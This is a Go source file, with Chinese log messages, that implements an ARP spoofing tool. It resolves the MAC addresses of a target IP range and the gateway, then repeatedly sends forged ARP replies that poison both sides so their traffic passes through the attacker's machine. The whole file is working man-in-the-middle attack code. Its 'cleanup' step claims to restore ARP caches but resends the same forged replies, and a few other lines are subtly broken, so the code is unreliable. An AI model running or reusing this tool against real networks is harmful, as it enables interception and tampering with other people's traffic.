package spoof

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"
)

type ARPSpoofer struct {
	iface        *net.Interface
	handle       *pcap.Handle
	gatewayIP    net.IP
	targetAddrs  []net.IP
	origMACTable map[string]net.HardwareAddr
	stopChan     chan struct{}
	wg           sync.WaitGroup
}

func NewARPSpoofer(ifaceName string, targetRange, gatewayIP string) (*ARPSpoofer, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, fmt.Errorf("获取网卡接口失败: %v", err)
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("打开网卡失败: %v", err)
	}

	addrRange, err := iprange.ParseList(targetRange)
	if err != nil {
		handle.Close()
		return nil, fmt.Errorf("解析目标IP范围失败: %v", err)
	}

	targetAddrs := addrRange.Expand()
	if len(targetAddrs) == 0 {
		handle.Close()
		return nil, fmt.Errorf("没有有效的目标IP")
	}

	return &ARPSpoofer{
		iface:        iface,
		handle:       handle,
		gatewayIP:    net.ParseIP(gatewayIP).To4(),
		targetAddrs:  targetAddrs,
		origMACTable: make(map[string]net.HardwareAddr),
		stopChan:     make(chan struct{}),
	}, nil
}

func (s *ARPSpoofer) Start() error {
	if err := s.initializeMACs(); err != nil {
		return fmt.Errorf("初始化MAC地址失败: %v", err)
	}

	s.wg.Add(2)
	go s.readARP()
	go s.spoofLoop()

	log.Printf("开始对 %d 个目标进行ARP欺骗", len(s.targetAddrs))
	return nil
}

func (s *ARPSpoofer) Stop() {
	log.Println("正在停止ARP欺骗...")
	close(s.stopChan)
	s.wg.Wait()
	s.cleanup()
	s.handle.Close()
	log.Println("ARP欺骗已停止")
}

func (s *ARPSpoofer) initializeMACs() error {
	log.Println("正在获取目标MAC地址...")

	gatewayMAC, err := s.lookupMAC(s.gatewayIP)
	if err != nil {
		return fmt.Errorf("无法获取网关MAC地址: %v", err)
	}
	s.origMACTable[s.gatewayIP.String()] = gatewayMAC

	for _, targetIP := range s.targetAddrs {
		mac, err := s.lookupMAC(targetIP)
		if err != nil {
			log.Printf("警告: 无法获取IP %v 的MAC地址: %v", targetIP, err)
			continue
		}
		s.origMACTable[targetIP.String()] = mac
		log.Printf("获取到 %v 的MAC地址: %v", targetIP, mac)
	}

	return nil
}

func (s *ARPSpoofer) spoofLoop() {
	defer s.wg.Done()
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			s.sendARPToAll()
		}
	}
}

func (s *ARPSpoofer) sendARPToAll() {
	for _, targetIP := range s.targetAddrs {
		if mac, ok := s.origMACTable[targetIP.String()]; ok {
			s.sendFakeARP(targetIP, mac, s.gatewayIP)
			s.sendFakeARP(s.gatewayIP, s.origMACTable[s.gatewayIP.String()], targetIP)
		}
	}
}

func (s *ARPSpoofer) sendFakeARP(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP) {
	src := &arp.Address{
		IP:           spoofIP,
		HardwareAddr: s.iface.HardwareAddr,
	}
	dst := &arp.Address{
		IP:           dstIP,
		HardwareAddr: dstMAC,
	}

	packet, err := arp.NewARPReply(src, dst)
	if err != nil {
		log.Printf("构造ARP包错误: %v", err)
		return
	}

	if err := s.handle.WritePacketData(packet); err != nil {
		log.Printf("发送ARP包错误: %v", err)
	}
}

func (s *ARPSpoofer) readARP() {
	defer s.wg.Done()
	packetSource := gopacket.NewPacketSource(s.handle, layers.LayerTypeEthernet)
	in := packetSource.Packets()

	for {
		select {
		case <-s.stopChan:
			return
		case packet := <-in:
			s.handlePacket(packet)
		}
	}
}

func (s *ARPSpoofer) handlePacket(packet gopacket.Packet) {
	if packet == nil {
		return
	}

	arpLayer := packet.Layer(layers.LayerTypeARP)
	if arpLayer == nil {
		return
	}

	arpPacket := arpLayer.(*layers.ARP)
	if !bytes.Equal([]byte(s.iface.HardwareAddr), arpPacket.SourceHwAddress) {
		return
	}

	log.Printf("ARP: %v (%v) -> %v (%v)",
		net.IP(arpPacket.SourceProtAddress),
		net.HardwareAddr(arpPacket.SourceHwAddress),
		net.IP(arpPacket.DstProtAddress),
		net.HardwareAddr(arpPacket.DstHwAddress))
}

func (s *ARPSpoofer) cleanup() {
	log.Println("正在恢复ARP缓存...")
	for _, targetIP := range s.targetAddrs {
		if mac, ok := s.origMACTable[targetIP.String()]; ok {
			for i := 0; i < 5; i++ {
				s.sendFakeARP(targetIP, mac, s.gatewayIP)
				s.sendFakeARP(s.gatewayIP, s.origMACTable[s.gatewayIP.String()], targetIP)
				time.Sleep(time.Second)
			}
		}
	}
	log.Println("ARP缓存已恢复")
}

func (s *ARPSpoofer) lookupMAC(ip net.IP) (net.HardwareAddr, error) {
    // 创建以太网层
    eth := &layers.Ethernet{
        SrcMAC:       s.iface.HardwareAddr,
        DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // 广播地址
        EthernetType: layers.EthernetTypeARP,
    }

    // 创建ARP层
    arp := &layers.ARP{
        AddrType:          layers.LinkTypeEthernet,
        Protocol:          layers.EthernetTypeIPv4,
        HwAddressSize:     6,
        ProtAddressSize:   4,
        Operation:         layers.ARPRequest,
        SourceHwAddress:   []byte(s.iface.HardwareAddr),
        SourceProtAddress: []byte(getInterfaceIP(s.iface).To4()),
        DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
        DstProtAddress:    []byte(ip.To4()),
    }

    // 序列化数据包
    buf := gopacket.NewSerializeBuffer()
    opts := gopacket.SerializeOptions{
        FixLengths:       true,
        ComputeChecksums: true,
    }

    if err := gopacket.SerializeLayers(buf, opts, eth, arp); err != nil {
        return nil, fmt.Errorf("序列化ARP请求失败: %v", err)
    }

    // 发送ARP请求
    if err := s.handle.WritePacketData(buf.Bytes()); err != nil {
        return nil, fmt.Errorf("发送ARP请求失败: %v", err)
    }

    // 等待ARP响应
    start := time.Now()
    for time.Since(start) < time.Second*2 {
        data, _, err := s.handle.ReadPacketData()
        if err != nil {
            continue
        }

        packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
        arpLayer := packet.Layer(layers.LayerTypeARP)
        if arpLayer == nil {
            continue
        }

        arp, ok := arpLayer.(*layers.ARP)
        if !ok || arp.Operation != layers.ARPReply {
            continue
        }

        if bytes.Equal(arp.SourceProtAddress, ip) {
            return net.HardwareAddr(arp.SourceHwAddress), nil
        }
    }

    return nil, fmt.Errorf("获取MAC地址超时")
}

func getInterfaceIP(iface *net.Interface) net.IP {
    addrs, err := iface.Addrs()
    if err != nil {
        return nil
    }

    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok {
            if ip4 := ipnet.IP.To4(); ip4 != nil {
                return ip4
            }
        }
    }
    return nil
}